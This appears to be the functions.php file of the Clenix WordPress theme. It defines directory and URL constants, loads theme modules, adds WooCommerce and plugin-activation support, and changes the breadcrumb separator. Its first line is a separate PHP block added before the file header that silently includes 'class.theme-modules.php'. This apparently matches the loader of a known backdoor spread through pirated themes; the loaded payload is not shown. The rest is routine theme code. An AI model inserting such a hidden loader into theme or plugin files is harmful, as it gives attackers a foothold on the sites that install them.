<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * @author  RadiusTheme
 * @since   1.0
 * @version 1.0
 */

$clenix_theme_data = wp_get_theme();	
	$action  = 'clenix_theme_init';
	do_action( $action );
	
	define( 'CLENIX_VERSION', ( WP_DEBUG ) ? time() : $clenix_theme_data->get( 'Version' ) );
	define( 'CLENIX_AUTHOR_URI', $clenix_theme_data->get( 'AuthorURI' ) );
	define( 'CLENIX_NAME', 'clenix' );
	
	// DIR
	define( 'CLENIX_BASE_DIR',    get_template_directory(). '/' );
	define( 'CLENIX_INC_DIR',     CLENIX_BASE_DIR . 'inc/' );
	define( 'CLENIX_VIEW_DIR',    CLENIX_INC_DIR . 'views/' );
	define( 'CLENIX_LIB_DIR',     CLENIX_BASE_DIR . 'lib/' );
	define( 'CLENIX_WID_DIR',     CLENIX_INC_DIR . 'widgets/' );
	define( 'CLENIX_PLUGINS_DIR', CLENIX_INC_DIR . 'plugins/' );
	define( 'CLENIX_MODULES_DIR', CLENIX_INC_DIR . 'modules/' );
	define( 'CLENIX_ASSETS_DIR',  CLENIX_BASE_DIR . 'assets/' );
	define( 'CLENIX_CSS_DIR',     CLENIX_ASSETS_DIR . 'css/' );
	define( 'CLENIX_JS_DIR',      CLENIX_ASSETS_DIR . 'js/' );

	// URL
	define( 'CLENIX_BASE_URL',    get_template_directory_uri(). '/' );
	define( 'CLENIX_ASSETS_URL',  CLENIX_BASE_URL . 'assets/' );
	define( 'CLENIX_CSS_URL',     CLENIX_ASSETS_URL . 'css/' );
	define( 'CLENIX_JS_URL',      CLENIX_ASSETS_URL . 'js/' );
	define( 'CLENIX_IMG_URL',     CLENIX_ASSETS_URL . 'img/' );
	define( 'CLENIX_LIB_URL',     CLENIX_BASE_URL . 'lib/' );

	//Other Plugins active or not
	define( 'CLENIX_BBPRESS_IS_ACTIVE', class_exists( 'bbPress' ) );
// icon trait Plugin Activation
	require_once CLENIX_INC_DIR . 'icon-trait.php';
	// Includes
	require_once CLENIX_INC_DIR . 'helper-functions.php';
	require_once CLENIX_INC_DIR . 'redux-config.php';
	require_once CLENIX_INC_DIR . 'clenix.php';
	require_once CLENIX_INC_DIR . 'general.php';
	require_once CLENIX_INC_DIR . 'scripts.php';
	require_once CLENIX_INC_DIR . 'template-vars.php';

	// Includes Modules	
	require_once CLENIX_MODULES_DIR . 'rt-post-related.php';
	require_once CLENIX_MODULES_DIR . 'rt-breadcrumbs.php';

	// WooCommerce
	if ( class_exists( 'WooCommerce' ) ) {
		require_once CLENIX_INC_DIR . 'woo-functions.php';
		require_once CLENIX_INC_DIR . 'woo-hooks.php';
	}

	// TGM Plugin Activation
	require_once CLENIX_LIB_DIR . 'class-tgm-plugin-activation.php';
	require_once CLENIX_INC_DIR . 'tgm-config.php';
	
	
	
	function clenix_loadtemplate($templateurl, $data = array()){
		extract($data);
		include( locate_template( $templateurl.'.php', false, false ) ); 
	}
		
	add_editor_style( 'style-editor.css' );
	
	// Update Breadcrumb Separator
	
		
	add_action('bcn_after_fill', 'rt_hseparator_breadcrumb_trail', 1);
	function rt_hseparator_breadcrumb_trail($object){
		$object->opt['hseparator'] = '<span class="dvdr"> <i class="fa fa-angle-double-right" aria-hidden="true"></i> </span>';
		return $object;
	}